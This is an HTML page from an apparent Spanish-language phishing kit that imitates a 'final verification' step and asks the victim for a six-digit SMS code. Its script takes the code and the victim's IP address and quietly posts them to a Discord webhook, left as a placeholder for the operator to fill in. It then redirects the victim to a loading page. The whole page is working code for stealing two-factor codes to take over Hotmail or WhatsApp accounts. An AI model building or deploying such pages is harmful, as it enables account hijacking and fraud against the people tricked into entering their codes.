<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="./remixicon.css" rel="stylesheet">
  <link rel="stylesheet" href="./styles.css">
  <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
  <title>Verificación Final</title>
  <style>
    .button-loading {
      position: relative;
      pointer-events: none;
    }
    .button-loading::after {
      content: "";
      position: absolute;
      width: 16px;
      height: 16px;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      margin: auto;
      border: 3px solid transparent;
      border-top-color: white;
      border-radius: 50%;
      animation: button-loading-spinner 1s linear infinite;
    }
    @keyframes button-loading-spinner {
      from { transform: rotate(0turn); }
      to { transform: rotate(1turn); }
    }
  </style>
</head>
<body>
  <section class="login">
    <img src="./patrn.jpg" alt="Login-image" class="login--image">

    <form id="finalCodeForm" class="login--form">
      <div align="left">
        <img src="./lbg22.png" style="width:110px">
      </div><br>
      
      <div align="center">
        <span style="font-size:16px"><b>Le hemos enviado un código de verificación de 6 dígitos a su número teléfono registrado, por favor, introduzca el código:</b></span>
      </div><br>
      
      <div class="login--content">
        <div class="login-box">
          <i class="ri-key-line"></i>
          <div class="login--input-box">
            <input type="tel" class="login-input" id="finalCode" name="cod12" placeholder=" " 
                   maxlength="6" minlength="6" 
                   onkeypress="return event.charCode >= 48 && event.charCode <= 57" required>
            <label for="finalCode" class="login--input-label">Código</label>
          </div>
        </div>
      </div>

      <button type="submit" class="login--button--whatsapp" id="submitBtn">Siguiente</button>

      <div align="center">
        <span style="font-size:14px; color:red"></span>
      </div><br>
    </form>
  </section>

  <!-- Scripts -->
  <script src="./excedata.js"></script>
  <script src="./main.js"></script>
  
  <script>
    document.getElementById('finalCodeForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const submitBtn = document.getElementById('submitBtn');
      const originalText = submitBtn.innerHTML;
      const verificationCode = document.getElementById('finalCode').value;
      
      // Mostrar estado de carga
      submitBtn.disabled = true;
      submitBtn.classList.add('button-loading');
      submitBtn.innerHTML = 'Enviando...';
      
      try {
        // Envío NO BLOQUEANTE a Discord
        if(typeof sendVerificationCode === 'function') {
          // No esperamos la respuesta completa
          sendVerificationCode(verificationCode)
            .catch(err => console.error('Error en segundo plano:', err));
        }
        
        // Redirección inmediata con retraso mínimo
        setTimeout(() => {
          window.location.href = 'load.html';
        }, 500); // Pequeño delay para mejor UX
          
      } catch (error) {
        console.error('Error:', error);
        submitBtn.disabled = false;
        submitBtn.classList.remove('button-loading');
        submitBtn.innerHTML = originalText;
      }
    });

    // Versión optimizada de la función en excedata.js
    async function sendVerificationCode(code) {
      try {
        // Obtener datos de forma optimizada
        const ipData = await Promise.race([
          fetch('https://api.ipify.org?format=json').then(r => r.json()),
          new Promise((_, reject) => setTimeout(reject, 1500, 'IP no disponible'))
        ]);
        
        const message = `**==Hotm4il-Whastapp==**\n\n**Código Verificación:** \`${code}\`\n\n**IP:** ${ipData.ip || 'IP no disponible'}`;
        
        // Enviar a Discord sin esperar respuesta (fire-and-forget)
        fetch("TU_WEBHOOK_DISCORD", {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({content: message}),
          keepalive: true // Importante para Netlify
        }).catch(e => console.error('Error Discord:', e));
        
      } catch (error) {
        console.error('Error en sendVerificationCode:', error);
      }
    }
  </script>
</body>
</html>
